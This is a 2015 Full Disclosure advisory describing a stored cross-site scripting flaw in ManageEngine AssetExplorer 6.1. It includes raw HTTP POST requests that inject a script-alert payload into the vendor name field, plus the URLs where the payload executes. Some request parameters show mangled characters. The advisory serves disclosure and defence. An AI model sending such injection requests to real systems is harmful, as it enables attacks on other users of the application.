
Date: Mon, 22 Jun 2015 10:55:00 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] ManageEngine Asset Explorer v6.1 - Persistent Vulnerability

Document Title:
===============
ManageEngine Asset Explorer v6.1 - Persistent Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1488


Release Date:
=============
2015-06-22


Vulnerability Laboratory ID (VL-ID):
====================================
1488


Common Vulnerability Scoring System:
====================================
3.5


Product & Service Introduction:
===============================
ManageEngine AssetExplorer is a web-based IT Asset Management (ITAM) software that helps you monitor and manage assets in your 
network from Planning phase to Disposal phase. AssetExplorer provides you with a number of ways to ensure discovery of all the 
assets in your network. You can manage software & hardware assets, ensure software license compliance and track purchase orders 
& contracts - the whole nine yards! AssetExplorer is very easy to install and works right out of the box.

(Copy of the Vendor Homepage: https://www.manageengine.com/products/asset-explorer/ )


Abstract Advisory Information:
==============================
An independent vulnerability laboratory researcher discovered an application-side cross site scripting web vulnerability in the official ManageEngine v6.1 Asset Explorer web-application.


Vulnerability Disclosure Timeline:
==================================
2015-06-22:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Manage Engine
Product: Asset Explorer - Web Application 6.1.0 (Build 6112)


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
An authenticated user with permissions to add new vendors can insert a cross site scripting payload into the vendor name field. This payload is then executed whenever any authenticated user visits either:
1.1 The edit page for the malicious vendor
1.2 The view contract page for a contract that is assigned to a malicious vendor

Vulnerable Product(s):
ManageEngine Asset Explorer

Affected Version(s):
Version 6.1.0 / Build Number 6112
(Earlier versions are likely also affected)

Vulnerability Type(s):
Persistent Cross Site Scripting


Proof of Concept (PoC):
=======================
The persistent cross site scripting web vulnerability can be exploited by remote attackers with low privileged application user account and low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

The cross site scripting payload is added by an authenticated user through a POST request to endorDef.do. The payload is then executing via GET requests to VenderDef.do or ContractDef.do.

PoC: The payload is added by a POST request to VendorDef.do:

	POST /VendorDef.do HTTP/1.1
	Host: [VULNERABLE]:8080
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Referer: http://[VULNERABLE]:8080/VendorDef.do?toShowView=addForm
	Cookie: JSESSIONID=D44D55DB9E14A3EA1A1F478BD506CD9D; 2Homehelpexp=helpexpshow; 2Homehelpcoll=helpcollhide; nonitassetslinks=hide; Components=hide; virtual=hide; viewlinks=hide; Softwarediv=hide; itassetslinks=show; swHomeDefaultMfg=-1; swHomeDefaultSite=-1; swHomeGraph=sdp.inventory.home.softwaremetering.rarely; [object HTMLTableRowElement]=show; [object HTMLDivElement]=show; [object HTMLTableCellElement]=show; JSESSIONIDSSO=FA5EBD2894D00C9FB4C3192C85FF96CC
	Connection: keep-alive
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 293
	itemID=&divToShow=detView&toShow=&organizationName=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&vendorCurrency=2&organizationDesc=&contactPerson=&doorNumber=&street=&landmark=&city=&postalCode=&state=&country=&organizationEmail=&organizationPhone=&organizationFax=&organizationUrl=&addButton=Save

PoC: Payload(s)
<script>alert(123)</script>

Note: The payload is then executed when visiting the following pages as an authenticated user:

Edit vendor page:
http://[VULNERABLE]:8080/VendorDef.do?mode=edit&id=3

View contract page:
http://[VULNERABLE]:8080/ContractDef.do?contractID=1

Note: The second exploit vector requires the extra step of associated the contract with a vendor through a POST request to ContractDef.do:

	POST /ContractDef.do HTTP/1.1
	Host: [VULNERABLE]:8080
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Referer: http://[VULNERABLE]:8080/ContractDef.do?coMode=editCO&cID=1
	Cookie: JSESSIONID=D44D55DB9E14A3EA1A1F478BD506CD9D; 2Homehelpexp=helpexpshow; 2Homehelpcoll=helpcollhide; nonitassetslinks=hide; Components=hide; virtual=hide; viewlinks=show; Softwarediv=hide; itassetslinks=hide; swHomeDefaultMfg=-1; swHomeDefaultSite=-1; swHomeGraph=sdp.inventory.home.softwaremetering.rarely; [object HTMLTableRowElement]=show; [object HTMLDivElement]=show; [object HTMLTableCellElement]=show; JSESSIONIDSSO=FA5EBD2894D00C9FB4C3192C85FF96CC
	Connection: keep-alive
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 317
	contractMode=¬ifyUsers=&contractName=test+contract&contractID=1&createdBy=2&categoryID=1&parentID=&vendorID=4&custContractID=123&comments=&supportDetails=&selectedAsset=¤tDate=2015-05-01&fromDate=2015-04-29&toDate=2015-10-02&totalPrice=0.00¬ifyMailIds=¬ifyDay=&beforeDays=&selected=&updateContract=Save
	
Reference(s):
http://[VULNERABLE]:8080/VendorDef.do?toShowView=addForm
http://[VULNERABLE]:8080/ContractDef.do?coMode=editCO&cID=1
http://[VULNERABLE]:8080/VendorDef.do?mode=edit&id=3
http://[VULNERABLE]:8080/ContractDef.do?contractID=1


Security Risk:
==============
The security risk of the (persistent) application-side input validation web vulnerability is estimated as medium. (CVSS 3.5)


Credits & Authors:
==================
Alain Homewood - PwC New Zealand (http://www.pwc.co.nz/services/assurance-services/pwc-security/)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com
PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/